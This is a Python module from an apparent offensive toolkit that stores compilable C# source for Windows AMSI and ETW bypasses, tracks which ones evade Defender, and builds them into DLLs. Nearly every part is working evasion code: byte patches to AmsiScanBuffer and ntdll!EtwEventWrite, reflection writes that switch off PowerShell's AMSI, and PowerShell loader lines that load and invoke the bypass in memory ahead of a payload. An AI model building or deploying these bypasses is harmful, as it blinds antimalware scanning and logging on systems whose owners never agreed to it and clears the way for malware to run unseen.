"""
AMSI and ETW bypass techniques.

This module packages well-known public bypass techniques as compile-
able C# source. Each technique:

  - Is a self-contained .NET Framework 4.8 assembly
  - Exposes a public static method named `Patch()`
  - Works via reflection / native API calls, without touching disk
  - Runs inside the current process only

Status (as of 2026-10-01, Windows 11 with Defender enabled):

  STATUS CODES:
    "works"      Tested, loads cleanly, not detected by Defender
    "caught"     Tested, Defender terminates the process
    "broken"     Tested, throws an exception (technique has a bug)
    "untested"   Not verified on a Defender-enabled machine

  | technique             | status    | notes                             |
  |-----------------------|-----------|-----------------------------------|
  | alloc_hglobal         | works     | Reflection write to managed field |
  | etw_patch             | works     | Patches ntdll!EtwEventWrite       |
  | reflection_disable    | works     | Sets amsiInitFailed = true        |
  | reflection_patch      | caught    | Behavior:Win32/AMSI_Patch_T.B12   |
  | context_patch         | untested  | Same family as reflection_patch   |
  | hwbp                  | broken    | GetThreadContext fails (struct)   |

  Working techniques are the default for chains. Caught techniques
  remain in the toolkit for testing against older Windows versions
  or Defender-disabled labs.

Usage from PowerShell (for any technique):

    $bytes = [IO.File]::ReadAllBytes("AmsiBypass.dll")
    $asm = [Reflection.Assembly]::Load($bytes)
    $asm.GetType("AmBypass.AmsiBypass").GetMethod("Patch").Invoke($null, @())

Or, to deliver bypass + payload in a single line, see
evade.delivery.wrap_script().

DISCLAIMER: These are public techniques. Running them against a
machine you don't control or don't have written authorization for
is a criminal offense.
"""

import hashlib
from pathlib import Path

from core.output import info, success, warn, error


# =====================================================================
# AMSI bypass — C# source templates
# =====================================================================

AMSI_REFLECTION_PATCH = r"""
using System;
using System.Runtime.InteropServices;

namespace AmBypass
{
    public static class AmsiBypass
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                           uint flNewProtect, out uint lpflOldProtect);

        static byte[] patch = new byte[] {
            0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
        };

        public static void Patch()
        {
            IntPtr hAmsi = GetModuleHandle("amsi.dll");
            if (hAmsi == IntPtr.Zero)
                throw new Exception("amsi.dll not loaded in current process");

            IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (pAmsiScanBuffer == IntPtr.Zero)
                throw new Exception("AmsiScanBuffer not found");

            uint old;
            if (!VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length,
                               0x40, out old))
                throw new Exception("VirtualProtect failed");

            Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);

            uint restore;
            VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length,
                          old, out restore);
        }
    }
}
"""


AMSI_CONTEXT_PATCH = r"""
using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace AmBypass
{
    public static class AmsiBypass
    {
        public static void Patch()
        {
            Type amsiUtils = Type.GetType(
                "System.Management.Automation.AmsiUtils," +
                " System.Management.Automation");
            if (amsiUtils == null)
            {
                AmBypassFallback.AmsiBypass.Patch();
                return;
            }

            FieldInfo amsiContext = amsiUtils.GetField(
                "amsiContext",
                BindingFlags.NonPublic | BindingFlags.Static);
            if (amsiContext == null)
                throw new Exception("amsiContext field not found");

            FieldInfo amsiInitFailed = amsiUtils.GetField(
                "amsiInitFailed",
                BindingFlags.NonPublic | BindingFlags.Static);
            if (amsiInitFailed != null)
                amsiInitFailed.SetValue(null, true);
        }
    }

    internal static class AmBypassFallback
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                           uint flNewProtect, out uint lpflOldProtect);

        static byte[] patch = new byte[] {
            0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
        };

        public static void Patch()
        {
            IntPtr hAmsi = GetModuleHandle("amsi.dll");
            if (hAmsi == IntPtr.Zero)
                throw new Exception("amsi.dll not loaded");
            IntPtr p = GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (p == IntPtr.Zero)
                throw new Exception("AmsiScanBuffer not found");
            uint old;
            VirtualProtect(p, (UIntPtr)patch.Length, 0x40, out old);
            Marshal.Copy(patch, 0, p, patch.Length);
            uint r;
            VirtualProtect(p, (UIntPtr)patch.Length, old, out r);
        }
    }
}
"""


AMSI_REFLECTION_DISABLE = r"""
using System;
using System.Reflection;

namespace AmBypass
{
    public static class AmsiBypass
    {
        public static void Patch()
        {
            Type amsiUtils = Type.GetType(
                "System.Management.Automation.AmsiUtils," +
                " System.Management.Automation");
            if (amsiUtils == null)
                throw new Exception(
                    "System.Management.Automation.AmsiUtils not found; " +
                    "this technique requires PowerShell");

            FieldInfo initFailed = amsiUtils.GetField(
                "amsiInitFailed",
                BindingFlags.NonPublic | BindingFlags.Static);
            if (initFailed == null)
                throw new Exception("amsiInitFailed field not found");

            initFailed.SetValue(null, true);
        }
    }
}
"""


AMSI_ALLOC_HGLOBAL = r"""
using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace AmBypass
{
    public static class AmsiBypass
    {
        public static void Patch()
        {
            Type amsiUtils = Type.GetType(
                "System.Management.Automation.AmsiUtils," +
                " System.Management.Automation");
            if (amsiUtils == null)
                throw new Exception(
                    "System.Management.Automation.AmsiUtils not found; " +
                    "this technique requires PowerShell");

            IntPtr fakeContext = Marshal.AllocHGlobal(9076);

            FieldInfo sessionField = amsiUtils.GetField(
                "amsiSession",
                BindingFlags.NonPublic | BindingFlags.Static);
            if (sessionField != null)
                sessionField.SetValue(null, null);

            FieldInfo contextField = amsiUtils.GetField(
                "amsiContext",
                BindingFlags.NonPublic | BindingFlags.Static);
            if (contextField == null)
                throw new Exception("amsiContext field not found");
            contextField.SetValue(null, fakeContext);
        }
    }
}
"""


AMSI_HWBP = r"""
using System;
using System.Runtime.InteropServices;

namespace AmBypass
{
    public static class AmsiBypass
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT ctx);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT ctx);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size,
                                           uint allocType, uint protect);

        [StructLayout(LayoutKind.Sequential)]
        struct M128A { public ulong Low; public long High; }

        // NOTE: This CONTEXT layout is not correct for x64. The real
        // struct from winnt.h has a different field order. This is
        // why the technique currently fails with GetThreadContext.
        // Kept here as a reference for the eventual fix.
        [StructLayout(LayoutKind.Sequential)]
        struct CONTEXT
        {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags;
            public uint MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10,
                         R11, R12, R13, R14, R15, Rip;
            public M128A Xmm0, Xmm1, Xmm2, Xmm3, Xmm4, Xmm5, Xmm6, Xmm7,
                         Xmm8, Xmm9, Xmm10, Xmm11, Xmm12, Xmm13, Xmm14, Xmm15;
        }

        static byte[] stub = new byte[] {
            0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
        };

        public static void Patch()
        {
            IntPtr hAmsi = GetModuleHandle("amsi.dll");
            if (hAmsi == IntPtr.Zero)
                throw new Exception("amsi.dll not loaded");
            IntPtr target = GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (target == IntPtr.Zero)
                throw new Exception("AmsiScanBuffer not found");

            IntPtr stubMem = VirtualAlloc(IntPtr.Zero, (UIntPtr)stub.Length,
                                          0x3000, 0x40);
            if (stubMem == IntPtr.Zero)
                throw new Exception("VirtualAlloc for stub failed");
            Marshal.Copy(stub, 0, stubMem, stub.Length);

            IntPtr hThread = GetCurrentThread();
            CONTEXT ctx = new CONTEXT();
            ctx.ContextFlags = 0x00100000;
            if (!GetThreadContext(hThread, ref ctx))
                throw new Exception("GetThreadContext failed");
            ctx.Dr0 = (ulong)target.ToInt64();
            ctx.Dr7 = (ctx.Dr7 & ~0xFUL) | 0x1UL;
            if (!SetThreadContext(hThread, ref ctx))
                throw new Exception("SetThreadContext failed");
        }
    }
}
"""


# =====================================================================
# ETW patch — C# source template
# =====================================================================

ETW_PATCH = r"""
using System;
using System.Runtime.InteropServices;

namespace EtwBypass
{
    public static class EtwPatch
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                           uint flNewProtect, out uint lpflOldProtect);

        public static void Patch()
        {
            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
            if (hNtdll == IntPtr.Zero)
                throw new Exception("ntdll.dll not loaded");

            IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
            if (pEtwEventWrite == IntPtr.Zero)
                throw new Exception("EtwEventWrite not found");

            uint old;
            if (!VirtualProtect(pEtwEventWrite, (UIntPtr)1, 0x40, out old))
                throw new Exception("VirtualProtect failed");

            byte[] patch = new byte[] { 0xC3 };
            Marshal.Copy(patch, 0, pEtwEventWrite, 1);

            uint restore;
            VirtualProtect(pEtwEventWrite, (UIntPtr)1, old, out restore);
        }
    }
}
"""


# =====================================================================
# Technique registry
# =====================================================================

TECHNIQUES = {
    "alloc_hglobal": {
        "kind": "amsi",
        "source": AMSI_ALLOC_HGLOBAL,
        "class": "AmBypass.AmsiBypass",
        "method": "Patch",
        "description": "Point PowerShell's AMSI context at a blank "
                       "buffer (no code patch, no amsi.dll write)",
        "status": "works",
        "verified_on": "2026-10-01",
        "notes": "Reflection write to managed field; Defender-clean "
                 "on Win11 2026-10",
    },
    "etw_patch": {
        "kind": "etw",
        "source": ETW_PATCH,
        "class": "EtwBypass.EtwPatch",
        "method": "Patch",
        "description": "Patch ntdll!EtwEventWrite with a ret (kills ETW)",
        "status": "works",
        "verified_on": "2026-10-01",
        "notes": "Code write to ntdll; Defender-clean on Win11 2026-10",
    },
    "reflection_disable": {
        "kind": "amsi",
        "source": AMSI_REFLECTION_DISABLE,
        "class": "AmBypass.AmsiBypass",
        "method": "Patch",
        "description": "Set AmsiUtils.amsiInitFailed = true via reflection",
        "status": "works",
        "verified_on": "2026-10-01",
        "notes": "Oldest technique but survives current Defender; "
                 "field name may change across PowerShell versions",
    },
    "reflection_patch": {
        "kind": "amsi",
        "source": AMSI_REFLECTION_PATCH,
        "class": "AmBypass.AmsiBypass",
        "method": "Patch",
        "description": "Patch AmsiScanBuffer with mov/ret (E_INVALIDARG)",
        "status": "caught",
        "verified_on": "2026-10-01",
        "notes": "Fires Behavior:Win32/AMSI_Patch_T.B12",
    },
    "context_patch": {
        "kind": "amsi",
        "source": AMSI_CONTEXT_PATCH,
        "class": "AmBypass.AmsiBypass",
        "method": "Patch",
        "description": "Set AmsiUtils.amsiContext via reflection "
                       "(fallback to amsi.dll patch)",
        "status": "untested",
        "verified_on": None,
        "notes": "Contains the same code patch as reflection_patch "
                 "as a fallback; likely caught",
    },
    "hwbp": {
        "kind": "amsi",
        "source": AMSI_HWBP,
        "class": "AmBypass.AmsiBypass",
        "method": "Patch",
        "description": "Hardware breakpoint on AmsiScanBuffer "
                       "(no memory write)",
        "status": "broken",
        "verified_on": "2026-10-01",
        "notes": "GetThreadContext fails; CONTEXT struct layout "
                 "is wrong. Fix deferred.",
    },
}


# Convenience sets
WORKING_TECHNIQUES = {k for k, v in TECHNIQUES.items()
                      if v.get("status") == "works"}
CAUGHT_TECHNIQUES = {k for k, v in TECHNIQUES.items()
                     if v.get("status") == "caught"}
UNSAFE_TECHNIQUES = {k for k, v in TECHNIQUES.items()
                     if v.get("status") in ("broken", "caught")}


# =====================================================================
# Compile
# =====================================================================

def compile(name: str, verbose: bool = False):
    """Compile a bypass technique via the payload framework."""
    spec = TECHNIQUES.get(name)
    if spec is None:
        raise ValueError(
            f"unknown technique: {name!r}; available: "
            f"{', '.join(sorted(TECHNIQUES.keys()))}")

    from payload import framework

    class_name = spec["class"].split(".")[-1]

    p = framework.Payload(
        language="csharp",
        source=spec["source"],
        target="net48",
        extra_files={
            "__output_type": "Library",
            "__assembly_name": class_name,
            "__namespace": spec["class"].split(".")[0],
        },
        post_processing=[],
        description=f"av_bypass {name}",
    )

    if verbose:
        info(f"  compiling {name} ({spec['kind']}, "
             f"status={spec['status']}) → "
             f"{class_name}.dll (net48)")

    p.build(verbose=verbose)
    return p


def compile_all(verbose: bool = False, only_working: bool = False) -> dict:
    """Compile techniques. Returns {name: Payload}.

    only_working=True skips techniques that aren't marked status=works.
    """
    out = {}
    for name, spec in TECHNIQUES.items():
        if only_working and spec.get("status") != "works":
            if verbose:
                info(f"  skipping {name} (status={spec.get('status')})")
            continue
        try:
            out[name] = compile(name, verbose=verbose)
        except Exception as e:
            warn(f"  failed to compile {name}: "
                 f"{type(e).__name__}: {e}")
    return out


# =====================================================================
# PowerShell loader snippets
# =====================================================================

def loader_ps1(name: str, dll_path: str | None = None) -> str:
    """Return a PowerShell snippet that loads and invokes a technique."""
    spec = TECHNIQUES.get(name)
    if spec is None:
        raise ValueError(f"unknown technique: {name!r}")

    cls = spec["class"]
    method = spec["method"]

    if dll_path:
        path_escaped = dll_path.replace("\\", "\\\\")
        read_line = (
            f'$bytes = [IO.File]::ReadAllBytes("{path_escaped}")'
        )
    else:
        read_line = "$bytes = <your bytes here>"

    return (
        f"{read_line}\n"
        f"$asm = [Reflection.Assembly]::Load($bytes)\n"
        f"$asm.GetType(\"{cls}\").GetMethod(\"{method}\")"
        f".Invoke($null, @())\n"
    )


# =====================================================================
# Human-readable listing
# =====================================================================

def list_techniques(only_working: bool = False) -> list[dict]:
    """Return a list of technique metadata dicts.

    only_working=True filters to status=works.
    """
    out = []
    for name in sorted(TECHNIQUES):
        spec = TECHNIQUES[name]
        if only_working and spec.get("status") != "works":
            continue
        out.append({
            "name": name,
            "kind": spec["kind"],
            "class": spec["class"],
            "method": spec["method"],
            "description": spec["description"],
            "status": spec.get("status", "untested"),
            "verified_on": spec.get("verified_on"),
            "notes": spec.get("notes", ""),
        })
    return out